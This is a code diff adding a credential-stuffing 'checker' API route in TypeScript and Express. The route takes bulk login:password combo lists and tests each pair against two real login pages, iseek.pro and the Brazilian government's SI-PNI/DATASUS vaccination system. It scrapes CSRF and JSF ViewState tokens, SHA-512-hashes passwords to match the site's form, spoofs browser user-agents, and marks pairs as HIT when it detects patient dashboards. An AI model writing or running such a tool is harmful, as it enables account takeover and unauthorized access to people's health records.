@@ -1,194 +1,329 @@
 import { Router, type IRouter } from "express";
+import { createHash } from "node:crypto";
 
 const router: IRouter = Router();
 
-// ── Constants ─────────────────────────────────────────────────────────────────
-const LOGIN_URL  = "https://iseek.pro/login";
-const TIMEOUT_MS = 15_000;
-
-const BASE_HEADERS: Record<string, string> = {
-  "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-};
-
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
+export type CheckerTarget = "iseek" | "datasus";
 
 export interface CheckResult {
   credential: string;
-  email:      string;
+  login:      string;
   status:     CheckStatus;
-  detail:     string;   // redirect URL on HIT, error message on ERROR, "back to login" on FAIL
+  detail:     string;
 }
 
-// ── Cookie jar helper ────────────────────────────────────────────────────────
-// fetch() doesn't auto-manage cookies. We collect Set-Cookie headers
-// from the GET response and replay them in the POST.
-function parseCookies(headers: Headers): string {
+export interface CheckerBulkResponse {
+  total:   number;
+  hits:    number;
+  fails:   number;
+  errors:  number;
+  results: CheckResult[];
+}
+
+// ── Shared helpers ────────────────────────────────────────────────────────────
+const MOBILE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
+const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+
+function parseCookieJar(headers: Headers): string {
   const raw = headers.getSetCookie?.() ?? [];
   return raw.map(c => c.split(";")[0]).join("; ");
 }
 
-// ── Token extractor ──────────────────────────────────────────────────────────
-function extractToken(html: string): string | null {
-  // Strategy 1: <input name="_token" value="...">
-  const m1 = html.match(/name=["']_token["']\s+value=["']([^"']+)["']/);
+/** Parse credentials from any format — supports email:pass, user:pass, newline/comma/semicolon separated */
+const MAX_BULK = 50;
+export function parseCredentials(raw: string): Array<{ login: string; password: string }> {
+  return raw
+    .split(/[\n,;|]+/)
+    .map(l => l.trim())
+    .filter(Boolean)
+    .slice(0, MAX_BULK)
+    .map(line => {
+      const idx = line.indexOf(":");
+      if (idx === -1) return null;
+      const login    = line.slice(0, idx).trim();
+      const password = line.slice(idx + 1).trim();
+      if (!login || !password) return null;
+      return { login, password };
+    })
+    .filter((x): x is { login: string; password: string } => x !== null);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  iSEEK CHECKER — https://iseek.pro/login
+//  Logic: GET → extract CSRF _token → POST creds → check redirect location
+// ═══════════════════════════════════════════════════════════════════════════════
+const ISEEK_URL = "https://iseek.pro/login";
+const ISEEK_TIMEOUT = 15_000;
+
+const ISEEK_HEADERS: Record<string, string> = {
+  "User-Agent":      DESKTOP_UA,
+  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+};
+
+function extractCsrfToken(html: string): string | null {
+  const m1 = html.match(/name=["']_token["'][^>]*value=["']([^"']+)["']/);
   if (m1) return m1[1];
-  // Strategy 2: value="..." name="_token"
-  const m2 = html.match(/value=["']([^"']+)["']\s+name=["']_token["']/);
+  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']_token["']/);
   if (m2) return m2[1];
-  // Strategy 3: _token anywhere near a 40-60 char alphanumeric value
   const m3 = html.match(/_token[^>]*value=["']([A-Za-z0-9+/=]{20,80})["']/);
   if (m3) return m3[1];
   return null;
 }
 
-// ── Core checker ─────────────────────────────────────────────────────────────
-async function checkCredential(email: string, password: string): Promise<CheckResult> {
-  const credential = `${email}:${password}`;
-  const signal     = AbortSignal.timeout(TIMEOUT_MS);
+async function checkIseek(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
 
-  // ── Step 1: GET login page → grab CSRF token + session cookies ─────────────
+  // Step 1: GET login page — grab CSRF token + cookies
   let getResp: Response;
   try {
-    getResp = await fetch(LOGIN_URL, {
-      method:   "GET",
-      headers:  { ...BASE_HEADERS },
+    getResp = await fetch(ISEEK_URL, {
+      headers:  { ...ISEEK_HEADERS },
       redirect: "follow",
-      signal,
+      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
     });
-  } catch (e: unknown) {
-    return { credential, email, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
   }
 
   const html      = await getResp.text().catch(() => "");
-  const cookieJar = parseCookies(getResp.headers);
-  const token     = extractToken(html);
+  const cookieJar = parseCookieJar(getResp.headers);
+  const token     = extractCsrfToken(html);
 
-  if (!token) {
-    return { credential, email, status: "ERROR", detail: "NO_TOKEN_FOUND" };
-  }
+  if (!token) return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };
 
-  // ── Step 2: POST credentials ───────────────────────────────────────────────
-  const body = new URLSearchParams({
-    _token:   token,
-    email:    email,
-    password: password,
-  });
-
+  // Step 2: POST credentials (no redirect follow — inspect Location header)
+  const body = new URLSearchParams({ _token: token, email: login, password });
   const postHeaders: Record<string, string> = {
-    ...BASE_HEADERS,
+    ...ISEEK_HEADERS,
     "Content-Type": "application/x-www-form-urlencoded",
-    "Referer":      LOGIN_URL,
+    "Referer":      ISEEK_URL,
     "Origin":       "https://iseek.pro",
+    ...(cookieJar ? { "Cookie": cookieJar } : {}),
   };
-  if (cookieJar) postHeaders["Cookie"] = cookieJar;
 
   let postResp: Response;
   try {
-    // First try without following redirects to inspect location header
-    postResp = await fetch(LOGIN_URL, {
+    postResp = await fetch(ISEEK_URL, {
       method:   "POST",
       headers:  postHeaders,
       body:     body.toString(),
       redirect: "manual",
-      signal:   AbortSignal.timeout(TIMEOUT_MS),
+      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
     });
-  } catch (e: unknown) {
-    return { credential, email, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
   }
 
-  const status  = postResp.status;
-  const isRedir = status >= 301 && status <= 308;
-
-  if (isRedir) {
+  if (postResp.status >= 301 && postResp.status <= 308) {
     const loc = postResp.headers.get("location") ?? "";
-    // HIT = redirected somewhere other than /login
     if (loc && !loc.includes("/login")) {
-      const detail = loc.startsWith("/") ? `https://iseek.pro${loc}` : loc;
-      return { credential, email, status: "HIT", detail };
+      return { credential, login, status: "HIT", detail: loc.startsWith("/") ? `https://iseek.pro${loc}` : loc };
     }
-    // Redirected back to login = wrong credentials
-    return { credential, email, status: "FAIL", detail: loc || "redirect_to_login" };
+    return { credential, login, status: "FAIL", detail: loc || "redirect_back_to_login" };
   }
 
-  // No redirect: follow and check final URL
+  // Fallback: follow redirects and check final URL
   try {
-    const final = await fetch(LOGIN_URL, {
+    const final = await fetch(ISEEK_URL, {
       method:   "POST",
       headers:  postHeaders,
       body:     body.toString(),
       redirect: "follow",
-      signal:   AbortSignal.timeout(TIMEOUT_MS),
+      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
     });
     const finalUrl = final.url;
     if (finalUrl && !finalUrl.includes("/login")) {
-      return { credential, email, status: "HIT", detail: finalUrl };
+      return { credential, login, status: "HIT", detail: finalUrl };
     }
-    return { credential, email, status: "FAIL", detail: finalUrl || "no_redirect" };
-  } catch (e: unknown) {
-    return { credential, email, status: "ERROR", detail: `POST_FOLLOW_ERROR:${String(e)}` };
+    return { credential, login, status: "FAIL", detail: finalUrl || "login_page" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `POST_FOLLOW:${String(e)}` };
   }
 }
 
-// ── Validation helpers ────────────────────────────────────────────────────────
-const MAX_BULK = 50; // max credentials per request to avoid abuse
+// ═══════════════════════════════════════════════════════════════════════════════
+//  DATASUS / SI-PNI CHECKER — https://sipni.datasus.gov.br
+//  Logic: GET page → extract ViewState + form ID → SHA-512 password → POST → check
+// ═══════════════════════════════════════════════════════════════════════════════
+const DATASUS_URL = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
+const DATASUS_TIMEOUT = 15_000;
 
-function parseCredentials(raw: string): Array<{ email: string; password: string }> {
-  return raw
-    .split(/[\n,;]+/)
-    .map(l => l.trim())
-    .filter(Boolean)
-    .slice(0, MAX_BULK)
-    .map(line => {
-      const colonIdx = line.indexOf(":");
-      if (colonIdx === -1) return null;
-      return { email: line.slice(0, colonIdx).trim(), password: line.slice(colonIdx + 1).trim() };
-    })
-    .filter((x): x is { email: string; password: string } => x !== null && x.email.length > 0 && x.password.length > 0);
+const DATASUS_HEADERS: Record<string, string> = {
+  "User-Agent": MOBILE_UA,
+  "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+};
+
+function sha512(text: string): string {
+  return createHash("sha512").update(text, "ascii").digest("hex");
+}
+
+function extractViewState(html: string): string {
+  // Standard JSF ViewState hidden input
+  const m = html.match(/name=["']javax\.faces\.ViewState["'][^>]*value=["']([^"']+)["']/);
+  if (m) return m[1];
+  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']javax\.faces\.ViewState["']/);
+  if (m2) return m2[1];
+  return "j_id1"; // fallback default
+}
+
+function extractFormId(html: string): string {
+  // Try known form IDs: j_idt23, j_idt26, etc.
+  const knownIds = ["j_idt23", "j_idt26", "loginForm", "j_idt25", "j_idt24"];
+  for (const id of knownIds) {
+    if (html.includes(`id="${id}"`)) return id;
+  }
+  // Fallback: first form with an id
+  const m = html.match(/<form[^>]+id=["']([^"']+)["']/);
+  if (m) return m[1];
+  return "j_idt23";
+}
+
+function extractSubmitId(html: string, formId: string): string {
+  // Try to find submit button inside the form
+  const m = html.match(new RegExp(`${formId}:([\\w]+)[^>]+type=["']submit["']`));
+  if (m) return `${formId}:${m[1]}`;
+  const m2 = html.match(/id=["']([^"']+)["'][^>]*type=["']submit["']/);
+  if (m2) return m2[1];
+  return `${formId}:j_idt32`; // default fallback from Python code
+}
+
+async function checkDataSUS(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+
+  // Step 1: GET login page — extract ViewState, form ID, cookies
+  let getResp: Response;
+  try {
+    getResp = await fetch(DATASUS_URL, {
+      headers:  { ...DATASUS_HEADERS },
+      redirect: "follow",
+      signal:   AbortSignal.timeout(DATASUS_TIMEOUT),
+    });
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+  }
+
+  if (getResp.status !== 200) {
+    return { credential, login, status: "ERROR", detail: `HTTP_${getResp.status}` };
+  }
+
+  const html       = await getResp.text().catch(() => "");
+  const cookieJar  = parseCookieJar(getResp.headers);
+  const viewState  = extractViewState(html);
+  const formId     = extractFormId(html);
+  const submitId   = extractSubmitId(html, formId);
+  const senhaHash  = sha512(password);
+
+  // Step 2: POST with SHA-512 hashed password (JSF form format)
+  const payload = new URLSearchParams({
+    [formId]:                      formId,
+    "javax.faces.ViewState":       viewState,
+    [`${formId}:usuario`]:         login,
+    [`${formId}:senha`]:           senhaHash,
+    [submitId]:                    submitId.includes(":") ? submitId.split(":")[1] : submitId,
+  });
+
+  const postHeaders: Record<string, string> = {
+    ...DATASUS_HEADERS,
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin":       "https://sipni.datasus.gov.br",
+    "Referer":      DATASUS_URL,
+    ...(cookieJar ? { "Cookie": cookieJar } : {}),
+  };
+
+  let postResp: Response;
+  try {
+    postResp = await fetch(DATASUS_URL, {
+      method:   "POST",
+      headers:  postHeaders,
+      body:     payload.toString(),
+      redirect: "manual",
+      signal:   AbortSignal.timeout(DATASUS_TIMEOUT),
+    });
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+  }
+
+  // 302 redirect away from login = LIVE (same logic as Python)
+  if (postResp.status === 302) {
+    const loc = postResp.headers.get("location") ?? "";
+    if (loc && !loc.includes("inicio.jsf")) {
+      return { credential, login, status: "HIT", detail: loc };
+    }
+    return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
+  }
+
+  // No redirect — read body and check keywords
+  let body2 = "";
+  try { body2 = (await postResp.text()).toLowerCase(); } catch { /**/ }
+
+  if (body2.includes("usuário ou senha inválidos") || body2.includes("senha incorreta") || body2.includes("usuario ou senha invalidos")) {
+    return { credential, login, status: "FAIL", detail: "senha_invalida" };
+  }
+  if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
+    return { credential, login, status: "HIT", detail: "dashboard_found" };
+  }
+  if (body2.includes("inicio.jsf") || body2.includes('type="password"')) {
+    return { credential, login, status: "FAIL", detail: "still_on_login" };
+  }
+
+  return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${postResp.status}` };
+}
+
+// ── Runner ────────────────────────────────────────────────────────────────────
+async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
+  const checker = target === "datasus" ? checkDataSUS : checkIseek;
+  const results: CheckResult[] = [];
+  for (const pair of pairs) {
+    const r = await checker(pair.login, pair.password);
+    results.push(r);
+    if (pairs.length > 1) await new Promise(ok => setTimeout(ok, 1_500));
+  }
+  return {
+    total:   results.length,
+    hits:    results.filter(r => r.status === "HIT").length,
+    fails:   results.filter(r => r.status === "FAIL").length,
+    errors:  results.filter(r => r.status === "ERROR").length,
+    results,
+  };
 }
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
-// body: { credentials: string[] }   e.g. ["email:pass", ...]  max 50
-// or   { email: string, password: string }  for single
+// body: { credentials: string[], target: "iseek" | "datasus" }
+// body: { login: string, password: string, target: "iseek" | "datasus" }
 router.post("/checker/check", async (req, res): Promise<void> => {
-  const { credentials, email, password } = req.body as {
+  const { credentials, login, password, target = "iseek" } = req.body as {
     credentials?: string[];
-    email?: string;
-    password?: string;
+    login?:       string;
+    password?:    string;
+    target?:      CheckerTarget;
   };
 
-  let pairs: Array<{ email: string; password: string }> = [];
+  if (target !== "iseek" && target !== "datasus") {
+    res.status(400).json({ error: "target must be 'iseek' or 'datasus'" });
+    return;
+  }
 
-  if (email && password) {
-    pairs = [{ email: email.trim(), password: String(password).trim() }];
+  let pairs: Array<{ login: string; password: string }> = [];
+  if (login && password) {
+    pairs = [{ login: login.trim(), password: String(password).trim() }];
   } else if (Array.isArray(credentials)) {
     pairs = parseCredentials(credentials.join("\n"));
   } else {
-    res.status(400).json({ error: "Provide { credentials: string[] } or { email, password }" });
+    res.status(400).json({ error: "Provide { credentials: string[] } or { login, password }" });
     return;
   }
 
   if (pairs.length === 0) {
-    res.status(400).json({ error: "No valid credentials provided" });
+    res.status(400).json({ error: "No valid credentials found" });
     return;
   }
 
-  // Sequential checks with small delay to avoid hammering the target
-  const results: CheckResult[] = [];
-  for (const pair of pairs) {
-    const r = await checkCredential(pair.email, pair.password);
-    results.push(r);
-    if (pairs.length > 1) await new Promise(ok => setTimeout(ok, 1500));
-  }
-
-  const hits  = results.filter(r => r.status === "HIT").length;
-  const fails = results.filter(r => r.status === "FAIL").length;
-  const errs  = results.filter(r => r.status === "ERROR").length;
-
-  res.json({ total: results.length, hits, fails, errors: errs, results });
+  const response = await runBulk(pairs, target);
+  res.json(response);
 });
 
 export default router;
